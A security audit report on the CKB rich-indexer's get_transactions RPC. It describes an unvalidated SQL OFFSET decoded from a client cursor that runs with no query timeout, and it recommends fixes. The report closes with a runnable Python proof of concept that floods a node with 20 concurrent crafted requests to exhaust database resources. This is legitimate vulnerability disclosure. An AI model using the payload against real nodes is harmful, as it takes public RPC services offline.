Audit Report

## Title
Unbounded SQL OFFSET via Attacker-Controlled Cursor Enables Remote DoS on Rich-Indexer RPC — (`util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs`)

## Summary
The `get_transactions` RPC endpoint (ungrouped path) decodes bytes 8–11 of the `after` cursor as an i32 SQL `OFFSET` with no upper-bound validation, allowing any caller to inject `OFFSET 2147483647` into the generated SQL. Because `AsyncRichIndexerHandle` has no per-query timeout (unlike the RocksDB path which uses `TimeoutIterator`), each such request forces the database to scan and discard up to 2^31 rows, consuming unbounded CPU and I/O. Concurrent requests from an unauthenticated attacker can exhaust DB resources and render the node's RPC service unresponsive.

## Finding Description

**Cursor decoding — no bounds check on offset:**
In `get_transactions.rs` lines 44–53, the `after` cursor is validated only for length == 12. Bytes 0–7 are decoded as `last` (i64) and bytes 8–11 are decoded as `offset` (i32) via `decode_i32`: [1](#0-0) 

`decode_i32` in `mod.rs` lines 286–294 performs only a length check and returns any valid i32, including `i32::MAX`: [2](#0-1) 

**Offset passed directly to SQL builder:**
In `get_tx_with_cell`, lines 180–182, the decoded offset is passed to `query_builder.offset()` with no clamping or upper-bound guard: [3](#0-2) 

This produces: `SELECT … FROM (…) AS res JOIN … WHERE tx_id >= 0 ORDER BY tx_id ASC LIMIT <n> OFFSET 2147483647`. Both SQLite and PostgreSQL implement OFFSET by scanning and discarding N rows — no index shortcut exists.

**No per-query timeout on the SQL path:**
`AsyncRichIndexerHandle` (mod.rs L23–27) has no `timeout_limit` field: [4](#0-3) 

The `TimeoutIterator` and `timeout_limit` exist only in the RocksDB-backed `IndexerService`/`IndexerHandle` (service.rs L30–62, L98–99): [5](#0-4) [6](#0-5) 

The SQL query in `AsyncRichIndexerHandle` runs to completion with no timeout.

**Only guard is on `limit`, not `offset`:**
Lines 23–32 check that `limit` is within `request_limit`, but this constrains only the number of rows returned, not the OFFSET value used to skip rows: [7](#0-6) 

## Impact Explanation

An unauthenticated remote attacker can send concurrent `get_transactions` RPC requests with a crafted 12-byte cursor (`[0x00×8] ++ [0xFF,0xFF,0xFF,0x7F]`), each forcing the DB to perform an O(N) full-table scan. With no per-query timeout and no rate limiting on the offset value, sustained concurrent requests exhaust DB CPU and I/O, making the node's RPC service unresponsive. This matches the allowed impact: **High — Vulnerabilities which could easily crash a CKB node** (RPC service rendered non-functional by resource exhaustion on any node with rich-indexer enabled).

## Likelihood Explanation

The cursor format is trivially derivable: the 12-byte length constraint is observable from any valid `last_cursor` response, and the LE encoding is standard. The attacker constructs the malicious cursor from scratch without any prior valid cursor, authentication, keys, or special privileges. The RPC endpoint is publicly accessible on any node with the rich-indexer enabled. The attack is repeatable and requires only HTTP access to port 8114.

## Recommendation

1. **Clamp the offset after decoding**: Reject or clamp `offset` to a small maximum (e.g., `limit - 1` or a fixed constant ≤ 1000). Legitimate pagination never requires an offset larger than the page size.
2. **Add a per-query timeout to `AsyncRichIndexerHandle`**: Mirror the `TimeoutIterator` pattern from `IndexerHandle` by wrapping SQL queries with a `tokio::time::timeout` or equivalent, using the same `timeout_limit` configuration field.
3. **Consider keyset pagination**: Replace the `(last_id, offset)` cursor design with a pure keyset cursor (e.g., `(last_id, last_io_type, last_io_index)`) using `WHERE (tx_id, io_type, io_index) > (last_id, last_io_type, last_io_index)`, eliminating SQL `OFFSET` entirely and making pagination O(1) regardless of cursor values.

## Proof of Concept

```python
import json, requests, struct, threading

NODE_RPC = "http://127.0.0.1:8114"

# Craft cursor: last_id=0 (tx_id >= 0 = all rows), offset=i32::MAX
last_id = struct.pack("<q", 0)            # 8 bytes LE i64
offset  = struct.pack("<i", 2147483647)   # 4 bytes LE i32::MAX
cursor  = "0x" + (last_id + offset).hex()

payload = {
    "jsonrpc": "2.0", "id": 1,
    "method": "get_transactions",
    "params": [
        {
            "script": {
                "code_hash": "0x9bd7e06f3ecf4be0f2fcd2188b23f1b9fcc88e5d4b65a8637b17723bbda3cce8",
                "hash_type": "type",
                "args": "0x"
            },
            "script_type": "lock"
        },
        "asc", "0x1", cursor
    ]
}

# Send concurrent requests to exhaust DB I/O
def attack():
    import time
    t0 = time.time()
    r = requests.post(NODE_RPC, json=payload)
    print(f"elapsed={time.time()-t0:.2f}s result={r.json()}")

threads = [threading.Thread(target=attack) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
# Expected: response times scale with DB size O(N), node RPC becomes unresponsive
```

**Verification**: On a node with millions of indexed transactions, each request should take seconds to minutes. DB CPU/IO metrics will spike. Concurrent requests will queue, eventually exhausting the DB connection pool or causing OOM, rendering the RPC unresponsive.
